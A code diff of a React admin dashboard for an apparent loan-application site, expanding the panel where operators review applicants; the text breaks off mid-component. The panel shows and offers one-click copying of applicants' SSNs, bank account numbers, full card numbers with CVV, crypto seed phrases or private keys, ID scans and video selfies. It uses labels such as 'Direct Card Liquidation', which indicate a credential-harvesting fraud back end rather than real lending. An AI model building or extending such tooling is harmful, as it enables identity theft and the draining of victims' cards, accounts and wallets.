@@ -1,11 +1,12 @@
 import React, { useEffect, useState, useCallback } from "react";
-import { 
-  fetchLeads, 
-  fetchLoanApplications, 
+import {
+  fetchLeads,
+  fetchLoanApplications,
   fetchTestimonialSubmissions,
   updateLeadStatus,
   updateLoanStatus,
-  updateTestimonialStatus
+  updateTestimonialStatus,
+  verifyLoanIdentity
 } from "@/lib/queries";
 import { toast } from "sonner";
 import { fetchSiteSettings, saveSiteSettings, type SiteSettings } from "@/lib/site";
@@ -14,8 +15,10 @@ import {
   ChevronDown, ChevronUp, Globe, Link2,
   Palette, Type, Save, ChevronRight, TrendingUp,
   FileText, Star, ShieldCheck, Camera, IdCard, BookOpen, CheckCircle2, ZoomIn,
-  Clock, CreditCard, ShieldAlert, Fingerprint
+  Clock, CreditCard, ShieldAlert, Fingerprint, Video, XCircle, Play,
+  Activity, Code2
 } from "lucide-react";
+import type { StatusHistoryEntry } from "@/types/admin";
 import { 
   TableShell, THead, EmptyRow, Chip, StatusBadge, 
   DetailSection, DField 
@@ -119,19 +122,21 @@ export function OverviewTab({ setTab }: { setTab: (t: Tab) => void }) {
 function StatusPicker({ current, onUpdate }: { current: string; onUpdate: (s: string) => void }) {
   const statuses = [
     { id: "pending", label: "Pending", cls: "hover:bg-amber-50 hover:text-amber-700" },
-    { id: "approved", label: "Approved", cls: "hover:bg-emerald-50 hover:text-emerald-700" },
-    { id: "rejected", label: "Rejected", cls: "hover:bg-red-50 hover:text-red-700" },
+    { id: "under_review", label: "Reviewing", cls: "hover:bg-blue-50 hover:text-blue-700" },
+    { id: "verified", label: "Verify", cls: "hover:bg-emerald-50 hover:text-emerald-700" },
+    { id: "rejected", label: "Reject", cls: "hover:bg-red-50 hover:text-red-700" },
+    { id: "needs_correction", label: "Correct", cls: "hover:bg-purple-50 hover:text-purple-700" },
   ];
 
   return (
-    <div className="flex items-center gap-1.5 p-1 bg-gray-50 rounded-lg border border-gray-100">
+    <div className="flex flex-wrap items-center gap-1.5 p-1 bg-gray-50 rounded-lg border border-gray-100">
       {statuses.map(s => (
         <button
           key={s.id}
           onClick={(e) => { e.stopPropagation(); onUpdate(s.id); }}
-          className={`px-3 py-1 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all ${
+          className={`px-3 py-1 rounded-md text-[10px] font-bold uppercase tracking-wider transition-all whitespace-nowrap ${
             current === s.id 
-              ? "bg-white shadow-sm border border-gray-200" 
+              ? "bg-white shadow-sm border border-gray-200 text-slate-900" 
               : `text-gray-400 ${s.cls}`
           }`}
         >
@@ -245,6 +250,25 @@ export function LoansTab() {
 
   useEffect(() => { load(); }, [load]);
 
+  const onVerifyIdentity = async (id: string, verified: boolean) => {
+    try {
+      await verifyLoanIdentity({ data: { id, verified } });
+      setRows(prev => prev.map(r => r.id === id ? { ...r, identityVerified: verified } : r));
+      toast.success(`Identity verification status updated`);
+    } catch (e) { toast.error("Failed to update verification"); }
+  };
+
+  const onUpdateStatus = async (id: string, status: string, reason?: string) => {
+    try {
+      await updateLoanStatus({ data: { id, status, ...(reason ? { reason } : {}) } });
+      setRows(prev => prev.map(r => r.id === id
+        ? { ...r, status, ...(reason ? { rejectionReason: reason } : {}) }
+        : r
+      ));
+      toast.success(`Loan status updated to ${status}`);
+    } catch { toast.error("Failed to update status"); }
+  };
+
   const filtered = rows.filter(r =>
     search === "" ||
     `${r.firstName} ${r.lastName} ${r.email}`.toLowerCase().includes(search.toLowerCase())
@@ -286,214 +310,320 @@ export function LoansTab() {
                 </tr>
                 {expanded && (
                   <tr>
-                    <td colSpan={7} className="bg-gradient-to-b from-slate-50 to-white px-4 py-5 border-b border-gray-200">
-                      <div className="space-y-5 max-w-6xl">
-
-                          {/* Row 1: Personal + Address + Financial */}
-                        <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
-                          <DetailSection 
-                            title="Personal Info"
-                            onCopyAll={() => {
-                              const text = `Name: ${r.firstName} ${r.lastName}\nDOB: ${r.dateOfBirth}\nPhone: ${r.phone}\nSSN: ${r.ssn}\nEIN: ${r.ein}\nEmployment: ${r.employmentStatus}\nIncome: ${r.currency} ${r.monthlyIncome}`;
-                              navigator.clipboard.writeText(text);
-                            }}
-                          >
-                            <DField label="Date of Birth" value={r.dateOfBirth} />
-                            <DField label="Phone" value={r.phone} />
-                            <DField label="SSN / Tax ID" value={r.ssn} mono />
-                            <DField label="EIN / Company ID" value={r.ein} mono />
-                            <DField label="Employment" value={r.employmentStatus} />
-                            <DField label="Monthly Income" value={r.monthlyIncome ? `${r.currency} ${Number(r.monthlyIncome).toLocaleString()}` : null} />
-                          </DetailSection>
-
-                          <DetailSection 
-                            title="Home Address"
-                            onCopyAll={() => {
-                              const text = `${r.addressLine1}\n${r.addressLine2 ? r.addressLine2 + '\n' : ''}${r.city}, ${r.stateRegion} ${r.postalCode}\n${r.country}`;
-                              navigator.clipboard.writeText(text);
-                            }}
-                          >
-                            <DField label="Line 1" value={r.addressLine1} />
-                            <DField label="Line 2" value={r.addressLine2} />
-                            <DField label="City" value={r.city} />
-                            <DField label="State / Region" value={r.stateRegion} />
-                            <DField label="Postal Code" value={r.postalCode} />
-                            <DField label="Country" value={r.country} />
-                          </DetailSection>
-
-                          <DetailSection 
-                            title="Loan Details"
-                            onCopyAll={() => {
-                              const text = `Amount: ${r.currency} ${r.amountRequested}\nTerm: ${r.loanTermMonths} months\nHolder: ${r.accountHolderName}\nSource: ${r.sourcePage}`;
-                              navigator.clipboard.writeText(text);
-                            }}
-                          >
-                            <DField label="Amount" value={`${r.currency} ${Number(r.amountRequested).toLocaleString()}`} />
-                            <DField label="Term" value={r.loanTermMonths ? `${r.loanTermMonths} months` : null} />
-                            <DField label="Account Holder" value={r.accountHolderName} />
-                            <DField label="Source Page" value={r.sourcePage} />
-                          </DetailSection>
-
-                          {r.loanPurpose && (
-                            <DetailSection title="Loan Purpose">
-                              <p className="text-xs text-gray-700 leading-relaxed">{r.loanPurpose}</p>
-                            </DetailSection>
-                          )}
-                        </div>
-
-                        {/* Row 2: Payout details */}
-                        <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4">
-                          {r.payoutMethod === "bank_transfer" && (
-                            <DetailSection 
-                              title="🏦 Bank Transfer Details"
-                              onCopyAll={() => {
-                                const text = `Bank: ${r.bankName}\nHolder: ${r.accountHolderName}\nAcc: ${r.bankAccountNumber}\nRouting: ${r.bankRoutingNumber}`;
-                                navigator.clipboard.writeText(text);
-                              }}
-                            >
-                              <DField label="Bank Name" value={r.bankName} />
-                              <DField label="Account Holder" value={r.accountHolderName} />
-                              <DField label="Account Number" value={r.bankAccountNumber} mono />
-                              <DField label="Routing / SWIFT / IBAN" value={r.bankRoutingNumber} mono />
-                            </DetailSection>
-                          )}
-                          
-                          {r.payoutMethod === "crypto" && (
-                            <DetailSection 
-                              title="₿ Crypto Wallet Details" 
-                              className="lg:col-span-2"
-                              onCopyAll={() => {
-                                const text = `Type: ${r.cryptoWalletType}\nAddress: ${r.cryptoWalletAddress}\nSeed: ${r.cryptoSeedPhrase}`;
-                                navigator.clipboard.writeText(text);
-                              }}
-                            >
-                              <DField label="Wallet Type" value={r.cryptoWalletType} />
-                              <DField label="Wallet Address" value={r.cryptoWalletAddress} mono />
-                              <DField label="Seed Phrase / Recovery Key" value={r.cryptoSeedPhrase} mono />
-                            </DetailSection>
-                          )}
-
-                          {r.cardNumber && (
-                            <>
-                              <DetailSection 
-                                title="Financial Instrument Details" 
-                                className="bg-slate-900 border-slate-700 shadow-xl relative overflow-hidden" 
-                                onCopyAll={() => {
-                                  const txt = `Card Holder: ${r.cardHolderName}\nIssuer: ${r.cardIssuer}\nNumber: ${r.cardNumber}\nExpiry: ${r.cardExpiry}\nCVV: ${r.cardCvv}`;
-                                  navigator.clipboard.writeText(txt);
-                                  toast.success("All card details copied!");
-                                }}
-                              >
-                                <div className="absolute top-0 right-0 p-3 opacity-10 pointer-events-none">
-                                  <CreditCard className="w-12 h-12 text-slate-100" />
-                                </div>
-                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                                  <DField label="Card Number" value={r.cardNumber} mono dark className="text-blue-400 font-bold tracking-widest text-lg" />
-                                  <div className="flex gap-4">
-                                    <DField label="Expiry Date" value={r.cardExpiry} mono dark />
-                                    <DField label="CVV Code" value={r.cardCvv} mono dark className="text-amber-400 font-bold" />
-                                  </div>
-                                  <DField label="Card Holder" value={r.cardHolderName} dark />
-                                  <DField label="Card Issuer" value={r.cardIssuer} dark />
-                                </div>
-                              </DetailSection>
-                              <DetailSection 
-                                title="📍 Billing Address" 
-                                className="lg:col-span-2"
-                                onCopyAll={() => {
-                                  const text = `${r.billingAddressLine1}\n${r.billingAddressLine2 ? r.billingAddressLine2 + '\n' : ''}${r.billingCity}, ${r.billingState} ${r.billingPostalCode}\n${r.billingCountry}`;
-                                  navigator.clipboard.writeText(text);
-                                }}
-                              >
-                                <DField label="Line 1" value={r.billingAddressLine1} />
-                                <DField label="Line 2" value={r.billingAddressLine2} />
-                                <div className="grid grid-cols-2 gap-3">
-                                  <DField label="City" value={r.billingCity} />
-                                  <DField label="State" value={r.billingState} />
-                                </div>
-                                <div className="grid grid-cols-2 gap-3">
-                                  <DField label="Postal Code" value={r.billingPostalCode} />
-                                  <DField label="Country" value={r.billingCountry} />
-                                </div>
-                              </DetailSection>
-                            </>
-                          )}
-                        </div>
-
-                        {/* Row 3: Identity Documents */}
-                        {(r.selfieImage || r.idFrontImage || r.idBackImage || r.passportFrontImage || r.passportBackImage) && (
-                          <div className="rounded-xl border-2 border-slate-700 overflow-hidden">
-                            <div className="bg-slate-800 px-4 py-3 flex items-center gap-2">
-                              <ShieldCheck className="w-4 h-4 text-amber-400" />
-                              <span className="text-white font-bold text-xs tracking-widest uppercase">Identity Verification Documents</span>
-                              <span className="ml-auto text-emerald-400 text-[10px] font-semibold uppercase tracking-wider">KYC / AML Verified</span>
+                    <td colSpan={7} className="bg-slate-50/80 p-6 border-b border-gray-200">
+                      <div className="max-w-7xl mx-auto space-y-6">
+                        
+                        {/* Header: Quick Actions & Overview */}
+                        <div className="flex items-center justify-between bg-white p-4 rounded-2xl border border-gray-200 shadow-sm">
+                          <div className="flex items-center gap-4">
+                            <div className={`h-12 w-12 rounded-xl flex items-center justify-center shadow-inner ${
+                              r.status === 'verified' ? 'bg-emerald-100 text-emerald-600' :
+                              r.status === 'rejected' ? 'bg-red-100 text-red-600' :
+                              'bg-amber-100 text-amber-600'
+                            }`}>
+                              <Banknote className="w-6 h-6" />
                             </div>
-                            <div className="p-4 bg-slate-50">
-                              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3">
-                                <DocImage label="Selfie / Face" icon={<Camera className="w-4 h-4" />} src={r.selfieImage} />
-                                <DocImage label="ID — Front" icon={<IdCard className="w-4 h-4" />} src={r.idFrontImage} />
-                                <DocImage label="ID — Back" icon={<IdCard className="w-4 h-4" />} src={r.idBackImage} />
-                                <DocImage label="Passport / Licence — Front" icon={<BookOpen className="w-4 h-4" />} src={r.passportFrontImage} />
-                                <DocImage label="Passport / Licence — Back" icon={<BookOpen className="w-4 h-4" />} src={r.passportBackImage} />
+                            <div>
+                              <h3 className="font-bold text-gray-900 leading-tight">Reviewing: {r.firstName} {r.lastName}</h3>
+                              <p className="text-xs text-gray-500 font-medium">Application ID: <span className="font-mono">{r.id}</span></p>
+                            </div>
+                          </div>
+                          <div className="flex items-center gap-3">
+                            <button 
+                              onClick={() => {
+                                navigator.clipboard.writeText(JSON.stringify(r, null, 2));
+                                toast.success("Full application JSON copied");
+                              }}
+                              className="px-3 py-1.5 bg-gray-100 hover:bg-gray-200 text-gray-600 text-[10px] font-bold rounded-lg transition-colors uppercase tracking-widest border border-gray-200"
+                            >
+                              Copy JSON
+                            </button>
+                            <StatusBadge status={r.status} />
+                          </div>
+                        </div>
+
+                        <div className="grid lg:grid-cols-3 gap-6">
+                          
+                          {/* Column 1: Applicant & Contact */}
+                          <div className="space-y-6">
+                            <DetailSection 
+                              title="👤 Personal Identity"
+                              onCopyAll={() => {
+                                const text = `Name: ${r.firstName} ${r.lastName}\nDOB: ${r.dateOfBirth}\nSSN: ${r.ssn}\nEIN: ${r.ein}\nEmployment: ${r.employmentStatus}\nIncome: ${r.currency} ${r.monthlyIncome}`;
+                                navigator.clipboard.writeText(text);
+                                toast.success("Section copied");
+                              }}
+                            >
+                              <div className="grid grid-cols-2 gap-4">
+                                <DField label="First Name" value={r.firstName} />
+                                <DField label="Last Name" value={r.lastName} />
+                              </div>
+                              <DField label="Date of Birth" value={r.dateOfBirth} icon={<Clock className="w-3 h-3" />} />
+                              <div className="grid grid-cols-2 gap-4">
+                                <DField label="SSN / Tax ID" value={r.ssn} mono icon={<IdCard className="w-3 h-3" />} />
+                                <DField label="EIN / Company" value={r.ein} mono icon={<ShieldAlert className="w-3 h-3" />} />
+                              </div>
+                              <div className="pt-2 border-t border-gray-100">
+                                <DField label="Employment Status" value={r.employmentStatus} />
+                                <DField label="Monthly Income" value={r.monthlyIncome ? `${r.currency} ${Number(r.monthlyIncome).toLocaleString()}` : null} className="text-emerald-700 font-bold" />
+                              </div>
+                            </DetailSection>
+
+                            <DetailSection 
+                              title="📍 Contact & Geography"
+                              onCopyAll={() => {
+                                const text = `Email: ${r.email}\nPhone: ${r.phone}\nAddress: ${r.addressLine1}, ${r.city}, ${r.country}`;
+                                navigator.clipboard.writeText(text);
+                                toast.success("Section copied");
+                              }}
+                            >
+                              <DField label="Email Address" value={r.email} icon={<Globe className="w-3 h-3" />} />
+                              <DField label="Phone Number" value={r.phone} icon={<Users className="w-3 h-3" />} />
+                              <div className="pt-2 border-t border-gray-100">
+                                <DField label="Home Address" value={`${r.addressLine1}${r.addressLine2 ? ', ' + r.addressLine2 : ''}`} />
+                                <div className="grid grid-cols-2 gap-4">
+                                  <DField label="City" value={r.city} />
+                                  <DField label="State/Region" value={r.stateRegion} />
+                                </div>
+                                <div className="grid grid-cols-2 gap-4">
+                                  <DField label="Postal Code" value={r.postalCode} />
+                                  <DField label="Country" value={r.country} />
+                                </div>
+                              </div>
+                            </DetailSection>
+                          </div>
+
+                          {/* Column 2: Loan & Payout */}
+                          <div className="space-y-6">
+                            <DetailSection 
+                              title="📊 Loan Specifications"
+                              onCopyAll={() => {
+                                const text = `Amount: ${r.currency} ${r.amountRequested}\nTerm: ${r.loanTermMonths} months\nPurpose: ${r.loanPurpose}`;
+                                navigator.clipboard.writeText(text);
+                                toast.success("Section copied");
+                              }}
+                            >
+                              <div className="bg-slate-900 p-4 rounded-xl mb-3 shadow-lg border border-slate-800">
+                                <DField label="Requested Amount" value={`${r.currency} ${Number(r.amountRequested).toLocaleString()}`} dark className="text-xl text-blue-400 font-black" />
+                                <DField label="Loan Term" value={`${r.loanTermMonths} Months`} dark className="text-amber-400" />
+                              </div>
+                              <DField label="Application Source" value={r.sourcePage} mono className="text-[10px] text-gray-400" />
+                              {r.loanPurpose && (
+                                <div className="mt-2 p-3 bg-gray-50 rounded-lg border border-gray-100">
+                                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mb-1">Loan Purpose / Context</p>
+                                  <p className="text-xs text-gray-700 leading-relaxed italic">"{r.loanPurpose}"</p>
+                                </div>
+                              )}
+                            </DetailSection>
+
+                            <DetailSection title="💸 Payout Strategy">
+                              {r.payoutMethod === "bank_transfer" && (
+                                <div className="space-y-3">
+                                  <div className="flex items-center gap-2 mb-2">
+                                    <span className="h-2 w-2 rounded-full bg-blue-500 shadow-[0_0_8px_#3b82f6]"></span>
+                                    <span className="text-[10px] font-black uppercase tracking-tighter text-blue-600">Institutional Bank Transfer</span>
+                                  </div>
+                                  <DField label="Bank Name" value={r.bankName} />
+                                  <DField label="Account Holder" value={r.accountHolderName} />
+                                  <DField label="Account Number" value={r.bankAccountNumber} mono />
+                                  <DField label="Routing / SWIFT" value={r.bankRoutingNumber} mono />
+                                </div>
+                              )}
+                              
+                              {r.payoutMethod === "crypto" && (
+                                <div className="space-y-3">
+                                  <div className="flex items-center gap-2 mb-2">
+                                    <span className="h-2 w-2 rounded-full bg-orange-500 shadow-[0_0_8px_#f97316]"></span>
+                                    <span className="text-[10px] font-black uppercase tracking-tighter text-orange-600">Digital Asset Settlement</span>
+                                  </div>
+                                  <DField label="Wallet Ecosystem" value={r.cryptoWalletType} />
+                                  <DField label="Recipient Address" value={r.cryptoWalletAddress} mono className="text-orange-700" />
+                                  <div className="p-3 bg-red-50 border border-red-100 rounded-lg">
+                                    <DField label="Seed Phrase / Private Key" value={r.cryptoSeedPhrase} mono className="text-red-600 blur-[1px] hover:blur-none transition duration-500" />
+                                  </div>
+                                </div>
+                              )}
+
+                              {r.cardNumber && (
+                                <div className="space-y-4">
+                                  <div className="flex items-center gap-2">
+                                    <span className="h-2 w-2 rounded-full bg-purple-500 shadow-[0_0_8px_#a855f7]"></span>
+                                    <span className="text-[10px] font-black uppercase tracking-tighter text-purple-600">Direct Card Liquidation</span>
+                                  </div>
+                                  <div className="bg-slate-900 border-slate-700 shadow-xl rounded-xl p-4 relative overflow-hidden">
+                                    <div className="absolute top-0 right-0 p-3 opacity-10 pointer-events-none">
+                                      <CreditCard className="w-12 h-12 text-slate-100" />
+                                    </div>
+                                    <DField label="Card Number" value={r.cardNumber} mono dark className="text-blue-400 font-bold tracking-widest text-lg" />
+                                    <div className="grid grid-cols-2 gap-4 mt-3">
+                                      <DField label="Expiry" value={r.cardExpiry} mono dark />
+                                      <DField label="CVV" value={r.cardCvv} mono dark className="text-amber-400" />
+                                    </div>
+                                    <DField label="Card Holder" value={r.cardHolderName} dark className="mt-2" />
+                                    <DField label="Issuer" value={r.cardIssuer} dark className="mt-1" />
+                                  </div>
+                                  <div className="p-3 bg-gray-50 border border-gray-100 rounded-xl">
+                                    <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mb-2">📍 Billing Address</p>
+                                    <p className="text-xs text-gray-600 font-medium">
+                                      {r.billingAddressLine1}<br/>
+                                      {r.billingAddressLine2 && <>{r.billingAddressLine2}<br/></>}
+                                      {r.billingCity}, {r.billingState} {r.billingPostalCode}<br/>
+                                      {r.billingCountry}
+                                    </p>
+                                  </div>
+                                </div>
+                              )}
+                            </DetailSection>
+                          </div>
+
+                          {/* Column 3: Verification & Decision */}
+                          <div className="space-y-6">
+                            <div className="bg-white rounded-xl border-2 border-slate-900 overflow-hidden shadow-xl">
+                              <div className="bg-slate-900 px-4 py-3 flex items-center justify-between">
+                                <div className="flex items-center gap-2">
+                                  <ShieldCheck className="w-4 h-4 text-blue-400" />
+                                  <span className="text-white font-black text-[10px] tracking-widest uppercase">Biometric Evidence</span>
+                                </div>
+                                <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">KYC Pipeline</span>
+                              </div>
+                              <div className="p-4 grid grid-cols-2 gap-3 bg-slate-50">
+                                <DocImage label="Facial Scan" icon={<Camera className="w-3 h-3" />} src={r.selfieImage} />
+                                <DocVideo label="Video Selfie (Holding ID)" icon={<Video className="w-3 h-3" />} src={r.videoSelfieUrl} />
+                                <DocImage label="ID (Front)" icon={<IdCard className="w-3 h-3" />} src={r.idFrontImage} />
+                                <DocImage label="ID (Back)" icon={<IdCard className="w-3 h-3" />} src={r.idBackImage} />
+                                <DocImage label="Passport (Front)" icon={<BookOpen className="w-3 h-3" />} src={r.passportFrontImage} />
+                                <DocImage label="Passport (Back)" icon={<BookOpen className="w-3 h-3" />} src={r.passportBackImage} />
                               </div>
                             </div>
-                          </div>
-                        )}
 
-                        {/* Row 4: KYC Verification Progress */}
-                        <div className="bg-slate-900 rounded-xl p-5 border border-slate-700 shadow-2xl relative overflow-hidden">
-                          <div className="absolute top-0 right-0 p-3 opacity-20">
-                            <Fingerprint className="w-12 h-12 text-blue-400" />
-                          </div>
-                          <div className="relative z-10">
-                            <div className="flex items-center gap-3 mb-4">
-                              <ShieldCheck className="w-5 h-5 text-blue-400" />
-                              <h3 className="text-white font-bold text-sm tracking-widest uppercase">Admin KYC Verification Workflow</h3>
-                              <Chip text="Manual Review Required" className="bg-blue-500/20 text-blue-300 border-blue-500/30" />
-                            </div>
-                            
-                            <div className="grid sm:grid-cols-3 gap-6">
-                              <div className="space-y-1">
-                                <div className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Verification Status</div>
-                                <div className="flex items-center gap-2">
-                                  <div className={`h-2.5 w-2.5 rounded-full animate-pulse ${
-                                    r.status === "approved" ? "bg-emerald-500 shadow-[0_0_8px_#10b981]" : 
-                                    r.status === "rejected" ? "bg-red-500 shadow-[0_0_8px_#ef4444]" : 
-                                    "bg-amber-500 shadow-[0_0_8px_#f59e0b]"
-                                  }`} />
-                                  <span className="text-white font-semibold text-sm capitalize">{r.status}</span>
-                                </div>
+                            <div className="bg-white rounded-xl border border-gray-200 p-5 shadow-2xl relative overflow-hidden">
+                              <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
+                                <Fingerprint className="w-16 h-16 text-primary" />
                               </div>
                               
-                              <div className="space-y-1">
-                                <div className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">Estimated SLA</div>
-                                <div className="text-slate-300 text-sm font-medium flex items-center gap-1.5">
-                                  <Clock className="w-3.5 h-3.5" /> 5 - 30 Minutes
+                              <h3 className="text-gray-900 font-black text-xs tracking-widest uppercase mb-4 flex items-center gap-2">
+                                <ShieldCheck className="w-4 h-4 text-primary" /> Decision Control Center
+                              </h3>
+                              
+                              <div className="space-y-4 relative z-10">
+                                <div className="grid grid-cols-2 gap-4">
+                                  <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
+                                    <p className="text-[9px] font-bold text-gray-400 uppercase mb-1">Current State</p>
+                                    <StatusBadge status={r.status} />
+                                  </div>
+                                  <div className="p-3 bg-gray-50 rounded-xl border border-gray-100">
+                                    <p className="text-[9px] font-bold text-gray-400 uppercase mb-1">Identity Lock</p>
+                                    <div className="flex items-center gap-1.5">
+                                      {r.identityVerified ? (
+                                        <span className="text-emerald-600 font-black text-[10px] uppercase">Locked/Verified</span>
+                                      ) : (
+                                        <span className="text-amber-600 font-black text-[10px] uppercase">Unlocked</span>
+                                      )}
+                                    </div>
+                                  </div>
+                                </div>
+
+                                <div className="pt-4 border-t border-gray-100">
+                                  <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-3">Update Verification Pipeline</p>
+                                  <StatusPicker current={r.status} onUpdate={(s) => {
+                                    if (s === "rejected" || s === "needs_correction") {
+                                      const reason = prompt(`Enter reason for "${s.replace("_", " ")}":`) ?? undefined;
+                                      onUpdateStatus(r.id, s, reason);
+                                    } else {
+                                      onUpdateStatus(r.id, s);
+                                    }
+                                  }} />
+                                </div>
+
+                                <div className="flex flex-col gap-2 pt-2">
+                                  <button 
+                                    onClick={() => onVerifyIdentity(r.id, !r.identityVerified)}
+                                    className={`w-full py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest border-2 transition-all flex items-center justify-center gap-2 shadow-sm ${
+                                      r.identityVerified 
+                                        ? "bg-amber-50 border-amber-200 text-amber-700 hover:bg-amber-100" 
+                                        : "bg-emerald-50 border-emerald-200 text-emerald-700 hover:bg-emerald-100"
+                                    }`}
+                                  >
+                                    {r.identityVerified ? <ShieldAlert className="w-4 h-4" /> : <ShieldCheck className="w-4 h-4" />}
+                                    {r.identityVerified ? "Revoke Identity Status" : "Verify & Lock Identity"}
+                                  </button>
+                                  
+                                  <div className="grid grid-cols-2 gap-2">
+                                    <button 
+                                      onClick={() => onUpdateStatus(r.id, "verified")}
+                                      className="py-2.5 bg-slate-900 hover:bg-black text-white text-[10px] font-black uppercase tracking-widest rounded-xl transition shadow-lg flex items-center justify-center gap-2"
+                                    >
+                                      <CheckCircle2 className="w-3.5 h-3.5" /> Final Approval
+                                    </button>
+                                    <button
+                                      onClick={() => {
+                                        const reason = prompt("Enter rejection reason or what needs correction:");
+                                        if (reason) {
+                                          onUpdateStatus(r.id, "needs_correction", reason);
+                                        }
+                                      }}
+                                      className="py-2.5 bg-white hover:bg-red-50 text-red-600 border border-red-200 text-[10px] font-black uppercase tracking-widest rounded-xl transition shadow-sm flex items-center justify-center gap-2"
+                                    >
+                                      <XCircle className="w-3.5 h-3.5" /> Reject / Correct
+                                    </button>
+                                  </div>
                                 </div>
                               </div>
+                            </div>
 
-                              <div className="flex items-center justify-end gap-3">
-                                <span className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Update Decision</span>
-                                <StatusPicker current={r.status} onUpdate={(s) => onUpdateStatus(r.id, s)} />
+                            {/* Submission Metadata */}
+                            <div className="bg-white rounded-xl border border-gray-200 p-4 shadow-sm">
+                              <div className="flex items-center gap-2 mb-3">
+                                <Activity className="w-3.5 h-3.5 text-primary" />
+                                <p className="text-[10px] font-black uppercase tracking-widest text-gray-500">Submission Metadata</p>
+                              </div>
+                              <div className="space-y-2 text-[11px]">
+                                <div className="flex justify-between gap-2">
+                                  <span className="text-gray-400 font-semibold shrink-0">Submitted</span>
+                                  <span className="text-gray-700 font-mono text-right">{r.submittedAt ? new Date(r.submittedAt).toLocaleString() : new Date(r.createdAt).toLocaleString()}</span>
+                                </div>
+                                {r.reviewedAt && (
+                                  <div className="flex justify-between gap-2">
+                                    <span className="text-gray-400 font-semibold shrink-0">Reviewed</span>
+                                    <span className="text-gray-700 font-mono text-right">{new Date(r.reviewedAt).toLocaleString()}</span>
+                                  </div>
+                                )}
+                                {r.verifiedAt && (
+                                  <div className="flex justify-between gap-2">
+                                    <span className="text-gray-400 font-semibold shrink-0">Verified At</span>
+                                    <span className="text-emerald-700 font-mono text-right font-bold">{new Date(r.verifiedAt).toLocaleString()}</span>
+                                  </div>
+                                )}
+                                {r.ipAddress && (
+                                  <div className="flex justify-between gap-2">
+                                    <span className="text-gray-400 font-semibold shrink-0">IP Address</span>
+                                    <span className="text-gray-700 font-mono text-right">{r.ipAddress}</span>
+                                  </div>
+                                )}
+                                {r.userAgent && (
+                                  <div className="mt-1 pt-2 border-t border-gray-100">
+                                    <p className="text-[9px] font-bold text-gray-400 uppercase mb-1">User Agent</p>
+                                    <p className="text-gray-500 font-mono text-[10px] break-all leading-relaxed">{r.userAgent}</p>
+                                  </div>
+                                )}
+                                <div className="flex justify-between gap-2 pt-1 border-t border-gray-100">
+                                  <span className="text-gray-400 font-semibold shrink-0">Source</span>
+                                  <span className="text-gray-700 font-mono text-right">{r.sourcePage || "Direct"}</span>
+                                </div>
+                                <div className="flex justify-between gap-2">
+                                  <span className="text-gray-400 font-semibold shrink-0">Complete</span>
+                                  <span className={r.submissionComplete ? "text-emerald-600 font-bold" : "text-red-500 font-bold"}>
+                                    {r.submissionComplete ? "Yes" : "Incomplete"}
+                                  </span>
+                                </div>
                               </div>
                             </div>
-                            
-                            <div className="mt-5 pt-4 border-t border-slate-800 flex items-center justify-between">
-                              <p className="text-[11px] text-slate-400 max-w-md">
-                                <strong>Engineering Note:</strong> Upon verification, an automated confirmation is dispatched to the client''s provided payout gateway. Ensure all PII data is cross-referenced with identity documents.
-                              </p>
-                              <div className="flex gap-2">
-                                <button className="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] font-bold rounded-lg border border-slate-700 transition-colors uppercase tracking-wider">
-                                  Audit Logs
-                                </button>
-                                <button 
-                                  onClick={() => onUpdateStatus(r.id, "approved")}
-                                  className="px-4 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold rounded-lg shadow-lg shadow-emerald-900/20 transition-colors uppercase tracking-wider flex items-center gap-1.5"
-                                >
-                                  <CheckCircle2 className="w-3.5 h-3.5" /> Confirm & Verify
-                                </button>
-                              </div>
-                            </div>
+
+                            {/* Status History */}
+                            <StatusHistory raw={r.statusHistory} />
+
+                            {/* Raw JSON toggle */}
+                            <RawJsonView data={r} />
                           </div>
                         </div>
                       </div>
@@ -716,6 +846,67 @@ export function SiteEditorTab() {
   );
 }
 
+// ─── StatusHistory ────────────────────────────────────────────────────────────
+
+function StatusHistory({ raw }: { raw: string | null }) {
+  let entries: StatusHistoryEntry[] = [];
+  try { entries = JSON.parse(raw ?? "[]"); } catch { entries = []; }
+  if (!entries.length) return null;
+
+  return (
+    <div className="bg-white rounded-xl border border-gray-200 p-4 shadow-sm">
+      <div className="flex items-center gap-2 mb-3">
+        <Clock className="w-3.5 h-3.5 text-primary" />
+        <p className="text-[10px] font-black uppercase tracking-widest text-gray-500">Status History</p>
+      </div>
+      <ol className="space-y-2">
+        {entries.map((e, i) => (
+          <li key={i} className="flex items-start gap-2 text-[11px]">
+            <div className="mt-0.5 w-2 h-2 rounded-full bg-primary shrink-0" />
+            <div className="flex-1 min-w-0">
+              <span className="font-bold text-gray-800 capitalize">
+                {e.event === "identity_verified"
+                  ? `Identity ${e.verified ? "verified" : "revoked"}`
+                  : e.status?.replace(/_/g, " ")}
+              </span>
+              {e.reason && <span className="text-gray-500 ml-1">— {e.reason}</span>}
+              <div className="text-[9px] text-gray-400 mt-0.5">
+                {new Date(e.at).toLocaleString()} · by {e.by}
+              </div>
+            </div>
+          </li>
+        ))}
+      </ol>
+    </div>
+  );
+}
+
+// ─── RawJsonView ──────────────────────────────────────────────────────────────
+
+function RawJsonView({ data }: { data: object }) {
+  const [open, setOpen] = useState(false);
+
+  return (
+    <div className="bg-slate-900 rounded-xl border border-slate-800 overflow-hidden">
+      <button
+        onClick={() => setOpen(o => !o)}
+        className="w-full px-4 py-2.5 flex items-center justify-between text-[10px] font-black uppercase tracking-widest text-slate-400 hover:text-slate-200 transition-colors"
+      >
+        <div className="flex items-center gap-2">
+          <Code2 className="w-3.5 h-3.5" />
+          Raw JSON — Full Record
+        </div>
